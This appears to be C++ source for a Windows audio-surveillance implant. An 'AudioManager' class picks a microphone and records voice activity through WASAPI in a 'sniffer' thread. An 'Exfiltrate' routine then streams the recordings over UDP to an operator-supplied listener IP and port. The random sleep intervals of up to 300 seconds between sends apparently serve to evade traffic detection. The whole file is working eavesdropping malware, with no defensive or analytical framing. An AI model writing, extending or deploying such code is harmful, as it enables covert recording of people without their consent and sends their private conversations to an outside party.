#include "audio.h"

void AudioManager::SetSleepMode(int modeInt) {
    // 1. Convert the int to our Enum
    SleepProfile profile = static_cast<SleepProfile>(modeInt);
    
    float min = 5.0f;
    float max = 10.0f;

    switch (modeInt) {
        case 0: min = 5.0f;  max = 10.0f; break; 
        case 1: min = 10.0f; max = 20.0f; break;
        case 2: min = 20.0f; max = 40.0f; break; 
        case 3: min = 40.0f; max = 80.0f; break;
        case 4: min = 5.0f;  max = 300.0f; break;
    }
    this->dist = std::uniform_real_distribution<float>{ min, max };
}

std::vector<std::wstring> AudioManager::GetMicrophones() {
    std::vector<std::wstring> microphones;

    IMMDeviceEnumerator* pLocalEnumerator = NULL;
    HRESULT hr = CoCreateInstance(__uuidof(MMDeviceEnumerator), NULL, CLSCTX_ALL, __uuidof(IMMDeviceEnumerator), (void**)&pLocalEnumerator);

    if (SUCCEEDED(hr)) {
        IMMDeviceCollection* pCollection = NULL;
        hr = pLocalEnumerator->EnumAudioEndpoints(eCapture, DEVICE_STATE_ACTIVE, &pCollection);

        if (SUCCEEDED(hr)) {
            UINT count;
            pCollection->GetCount(&count);

            for (UINT i = 0; i < count; i++) {
                IMMDevice* pEndpoint = NULL;
                pCollection->Item(i, &pEndpoint);

                IPropertyStore* pProps = NULL;
                pEndpoint->OpenPropertyStore(STGM_READ, &pProps);

                PROPVARIANT varName;
                PropVariantInit(&varName);

                if (SUCCEEDED(pProps->GetValue(PKEY_Device_FriendlyName, &varName))) {
                    if (varName.pwszVal != nullptr) {
                        microphones.push_back(std::wstring(varName.pwszVal));
                    }
                }

                PropVariantClear(&varName);
                pProps->Release();
                pEndpoint->Release();
            }
            pCollection->Release();
        }
        else {
            std::cerr << "[-] Failed to initialze local audio enumerator. " << std::endl;
        }
        pLocalEnumerator->Release();
    }
    return microphones;
}

void AudioManager::ListMicrophones() {
    int i = 1;
    for (const std::wstring& microphone : GetMicrophones()) {
        std::wcout << i << L". " << microphone << std::endl;
        i++;
    }
}

void AudioManager::SelectMicrophoneFromInt(int micIndex) {
    if (!pEnumerator) {
        (void)CoInitialize(NULL);
        HRESULT hr = CoCreateInstance(__uuidof(MMDeviceEnumerator), NULL, CLSCTX_ALL, __uuidof(IMMDeviceEnumerator), (void**)&pEnumerator);
        if (FAILED(hr)) {
            std::cerr << "[-] Failed to create instance of device enumerator" << std::endl;
            return;
        }
    }
    else {
        std::cerr << "[-] pEnumerator is NULL! cant select a microphone" << std::endl;
    }

    IMMDeviceCollection* pCollection = NULL;
    HRESULT hr = pEnumerator->EnumAudioEndpoints(eCapture, DEVICE_STATE_ACTIVE, &pCollection);

    if (SUCCEEDED(hr)) {
        IMMDevice* pEndpoint = NULL;
        // We use micIndex (the argument name) here
        if (SUCCEEDED(pCollection->Item(micIndex - 1, &pEndpoint))) {
            LPWSTR pwszID = NULL;
            if (SUCCEEDED(pEndpoint->GetId(&pwszID))) {
                this->targetDeviceId = pwszID; // Save to the class member
                CoTaskMemFree(pwszID);
            }
            pEndpoint->Release();
        }
        else {
            std::cerr << "[-] Failed to fetch microphone from index: " << micIndex << " using default microphone." << std::endl;
        } 
        pCollection->Release();
    }
    else {
        std::cerr << "[-] Failed to initialze local audio enumerator. " << std::endl;
    }
}

void AudioManager::RandomSleep() {
    float value = dist(gen);

    auto t0 = std::chrono::steady_clock::now();
    std::this_thread::sleep_for(std::chrono::duration<float>(value));
    auto t1 = std::chrono::steady_clock::now();

    std::chrono::duration<double> elapsed = t1 - t0;
    std::cout << "[sleep] requested=" << value
        << "s actual=" << elapsed.count() << "s\n";
}

void AudioManager::SetListener(std::string ip_address, int port) {
    WSADATA wsa;
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
        return;
    }

    udpSocket = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (udpSocket == INVALID_SOCKET) {
        WSACleanup();
        std::cerr << "[-] Failed to create socket object!" << std::endl;
        return;
    }

    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(port);
    ZeroMemory(&serverAddr, sizeof(serverAddr));
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(static_cast<u_short>(port));
    if (inet_pton(AF_INET, ip_address.c_str(), &serverAddr.sin_addr) != 1) {
        std::cerr << "[-] Bad IP: " << ip_address << "\n";
        return;
    }
    socketInitialized = true;
}

bool AudioManager::Initialize() {
    HRESULT hr;
    hr = CoInitialize(NULL);

    hr = CoCreateInstance(__uuidof(MMDeviceEnumerator), NULL, CLSCTX_ALL, __uuidof(IMMDeviceEnumerator), (void**)&pEnumerator);
    if (FAILED(hr)) return false;

    if (targetDeviceId.empty()) {
        hr = pEnumerator->GetDefaultAudioEndpoint(eCapture, eConsole, &pDevice);
    }
    else {
        hr = pEnumerator->GetDevice(targetDeviceId.c_str(), &pDevice);
    }

    hr = pDevice->Activate(__uuidof(IAudioClient), CLSCTX_ALL, NULL, (void**)&pAudioClient);
    if (FAILED(hr)) return false;

    /* Note: We use a local struct to define our desired format.
       We use the "AUTOCONVERTPCM" flag so Windows handles the math
       of turning 48kHz Stereo into 16kHz Mono for us.
    */
    WAVEFORMATEX targetFormat = { 0 };
    targetFormat.wFormatTag = WAVE_FORMAT_PCM;
    targetFormat.nChannels = 1;
    targetFormat.nSamplesPerSec = 16000;
    targetFormat.wBitsPerSample = 16;     
    targetFormat.nBlockAlign = 2;         
    targetFormat.nAvgBytesPerSec = targetFormat.nSamplesPerSec * targetFormat.nBlockAlign;
    targetFormat.cbSize = 0;

    // Use AUDCLNT_STREAMFLAGS_AUTOCONVERTPCM to force the lower sample rate
    hr = pAudioClient->Initialize(
        AUDCLNT_SHAREMODE_SHARED,
        AUDCLNT_STREAMFLAGS_AUTOCONVERTPCM | AUDCLNT_STREAMFLAGS_SRC_DEFAULT_QUALITY,
        10000000,
        0,
        &targetFormat,
        NULL
    );

    if (FAILED(hr)) {
        // If 16kHz fails, fall back to the system mix format
        pAudioClient->GetMixFormat(&pwfx);
        hr = pAudioClient->Initialize(AUDCLNT_SHAREMODE_SHARED, 0, 10000000, 0, pwfx, NULL);
    }
    else {
        if (pwfx) CoTaskMemFree(pwfx); // Clean up old memory if it exists
        pwfx = (WAVEFORMATEX*)CoTaskMemAlloc(sizeof(WAVEFORMATEX));
        if (pwfx != 0) {
            memcpy(pwfx, &targetFormat, sizeof(WAVEFORMATEX));
        }
        else {
            std::cerr << "[-] Failed to initialize Audio Mix Format" << std::endl;
        }
    }

    hr = pAudioClient->GetService(__uuidof(IAudioCaptureClient), (void**)&pCaptureClient);
    return SUCCEEDED(hr);
}

void AudioManager::Release() {
	pAudioClient->Stop();
	pAudioClient->Release();
	pCaptureClient->Release();
	pDevice->Release();
	pEnumerator->Release();
	CoUninitialize();
}

void AudioManager::LaunchSnifferThread() {
	sniffer = std::thread(&AudioManager::AudioSniffer, this);
}

void AudioManager::AudioSniffer() {
    pAudioClient->Start();

    while (bRunning) {
        UINT32 packetLength = 0;
        pCaptureClient->GetNextPacketSize(&packetLength);

        while (packetLength != 0) {
            BYTE* pData;
            UINT32 numFrames;
            DWORD flags;

            if (FAILED(pCaptureClient->GetBuffer(&pData, &numFrames, &flags, NULL, NULL))) break;

            if (!(flags & AUDCLNT_BUFFERFLAGS_SILENT)) {
                short* sData = (short*)pData;
                float totalPower = 0.0f;

                // Process 16-bit PCM Mono
                for (UINT32 i = 0; i < numFrames; i++) {
                    // Convert to absolute float for power calculation
                    totalPower += fabsf((float)sData[i] / 32768.0f);
                }

                float averagePower = totalPower / numFrames;

                // If power is above threshold, save the raw bytes
                if (averagePower > 0.002f) {
                    std::lock_guard<std::mutex> lock(bufferMutex);
                    char* raw = reinterpret_cast<char*>(sData);
                    globalAudioBuffer.insert(globalAudioBuffer.end(), raw, raw + (numFrames * sizeof(short)));
                }
            }

            pCaptureClient->ReleaseBuffer(numFrames);
            pCaptureClient->GetNextPacketSize(&packetLength);
        }
        Sleep(1);
    }
}


void AudioManager::Exfiltrate() {
    using clock = std::chrono::steady_clock;
    auto nextFlush = clock::now();
    const auto flushEvery = std::chrono::seconds(5);

    const size_t CHUNK_SIZE = 1440;

    while (bRunning) {
        RandomSleep();

        if (clock::now() < nextFlush) {
            std::this_thread::sleep_for(std::chrono::milliseconds(100));
            continue;
        }

        std::vector<char> dataToProcess;
        {
            std::unique_lock<std::mutex> lock(bufferMutex);

            if (globalAudioBuffer.size() < 10240 && bRunning) {
                lock.unlock();
                std::this_thread::sleep_for(std::chrono::milliseconds(200));
                continue;
            }

            dataToProcess.swap(globalAudioBuffer);
        }

        if (dataToProcess.empty()) continue;

        if (socketInitialized) {
            size_t offset = 0;
            size_t totalSize = dataToProcess.size();

            while (offset < totalSize && bRunning) {
                size_t remaining = totalSize - offset;
                size_t toSend = (remaining > CHUNK_SIZE) ? CHUNK_SIZE : remaining;

                int result = sendto(udpSocket,
                    dataToProcess.data() + offset,
                    static_cast<int>(toSend), 0,
                    (struct sockaddr*)&serverAddr,
                    sizeof(serverAddr));

                if (result == SOCKET_ERROR) {
                    int err = WSAGetLastError();
                    if (err != 10054) { // Ignore connection reset by peer
                        std::cerr << "[!] Socket Error: " << err << "\n";
                        break;
                    }
                }

                offset += toSend;

                /* PACING LOGIC:
                   Sending 35k packets instantly is a "burst."
                   This tiny sleep (1-2ms) ensures the network card and
                   the receiver can breathe.
                */
                if (offset < totalSize) {
                    std::this_thread::sleep_for(std::chrono::milliseconds(1));
                }
            }

            std::cout << "[+] Exfiltrated " << totalSize / 1024 << " KB across "
                << (totalSize / CHUNK_SIZE) + 1 << " packets.\n";
        }

        nextFlush = clock::now() + flushEvery;
    }
}

void AudioManager::Stop() {
    bRunning = false;
    if (sniffer.joinable()) sniffer.join();
    if (exfilThread.joinable()) exfilThread.join();
    Release();
}

void AudioManager::Start() {
    if (!bRunning) {
        bRunning = true;
    }

    if (!socketInitialized) {
        std::cerr << "[-] Failed to connect to listener!" << std::endl;
        return;
    }
    

    LaunchSnifferThread();
    exfilThread = std::thread(&AudioManager::Exfiltrate, this);
    exfilThread.join();
    Stop();
}
